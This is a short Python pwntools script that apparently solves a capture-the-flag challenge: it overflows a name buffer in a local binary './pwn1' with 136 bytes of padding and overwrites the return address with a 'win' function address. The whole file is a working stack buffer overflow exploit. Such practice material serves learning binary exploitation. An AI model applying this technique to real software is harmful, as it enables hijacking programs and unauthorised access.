from pwn import *

p = process("./pwn1")

payload = b"a"*136
payload += p64(0xDEADBEEF)
win = 0x000000000040130c
payload += p64(win)

p.sendlineafter(b"Enter your name:", payload)
p.interactive()